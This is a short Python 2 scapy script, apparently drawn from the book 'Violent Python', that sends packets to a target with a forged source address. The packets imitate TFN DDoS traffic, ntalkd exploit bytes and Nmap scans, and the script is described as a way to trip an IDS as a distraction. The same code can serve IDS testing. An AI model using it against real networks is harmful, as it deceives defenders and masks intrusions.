#!/usr/bin/env python2
# written by Moses Arocha
# Written with the help of TJ O'Connor in his book "Violent Python"
# The purpose of this code is to be detected! It will be detected by the IDS, this can be used as a distraction technique.

from scapy.all import *
from random import randint

import optparse
import sys
import os


#DDOS TFN packets, with the ICMP ID of 678, sending it to the port 31335 a registered DDOS attack port
def ddosTest(source, destination, iface, count):
    pkt = IP(src=source,dst=destination)/ICMP(type=8,id=678)/Raw(load='1234567890')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=source,dst=destination)/ICMP(type=0)/Raw(load='ASDFGHJKLP')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=source,dst=destination)/UDP(dport=31335)/Raw(load='PINGPONG')	# Defines that it will transmit the packet over the UDP protocol
    send(pkt, iface=iface, count=count)
    pkt = IP(src=source,dst=destination)/ICMP(type=0,id=456)
    send(pkt, iface=iface, count=count)
# After function is run it will alert the IDS and then the Network Administrator, this is a registered Attack.


# Attempts to replicate a ping scan, that might be commensed
def FakePingTest(source, destination, iface, count):
    pkt = IP(src=source, dst=destination)/ICMP(type=3,id=13)/Raw(load='ping')	
    send(pkt, iface=iface, count=count)						


#Generates packets that will send ntalkd Linux exploit for the first packet, the second will contain a mixture of hexadecimal and ASCII characters
def exploitTest(source, destination, iface, count):			# Sends the two created packets over ports 518 and 635
    pkt = IP(src=source, dst=destination)/UDP(dport=518)/Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)							
    pkt = IP(src=source, dst=destination)/UDP(dport=635)/Raw(load="^\B0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)						
# After function is run it will alert the IDS for any exploit attempts

# Will send packets with the signatures of the reconissance tools of Nmap and Observation
def scanTest(source, destination, iface, count):
    pkt = IP(src=source, dst=destination)/UDP(dport=53)/Raw(load='nmap')		
    send(pkt)									
    pkt = IP(src=source, dst=destination)/UDP(dport=126)/Raw(load='observation')
    send(pkt, iface=iface, count=count)							
	

def main():
    if not os.geteuid() == 0:
        sys.exit('\tMust Be Root!')
    parser = optparse.OptionParser("Usages For Program: -I <Interface> -S <Source> -T <Target> -C <Count>")
    parser.add_option('-S', dest='src', type='string', help='Specify Source Address')
    parser.add_option('-I', dest='iface', type='string', help='Specify Network Interface')
    parser.add_option('-T', dest='tgt', type='string', help='Specify Target Address')
    parser.add_option('-C', dest='count', type='int', help='Specify Packet Count')
    (options, args) = parser.parse_args()
    if options.iface == None:
        iface = 'wlan0'							# The default interface is wlan0.
    else:
	iface = options.iface
    if options.src == None:
        source = '.'.join([str(randint(1,254)) for x in range(4)])	# If user does not insert in IP Address, it will automatically generate.
        print " Source IP Address: " + source
    else:
	source = options.src
    if options.tgt == None:
	print parser.usage
	exit(0)
    else:
	destination = options.tgt
    if options.count == None:
	count = 5							# If not inserted by the user, the default count is 5 times.
    else:
	count = options.count
    print "\n\n\tDDOS TFN Packets Sent"
    ddosTest(source, destination, iface, count)
    print "\n\n\tFake Ping Scan"
    FakePingTest(source, destination, iface, count)
    print "\n\n\tNTALKD Linux Exploit Packets Sent"
    exploitTest(source, destination, iface, count)
    print "\n\n\tReconissance Tools Packets Sent"
    scanTest(source, destination, iface, count)
	

if __name__ == '__main__':
    main()
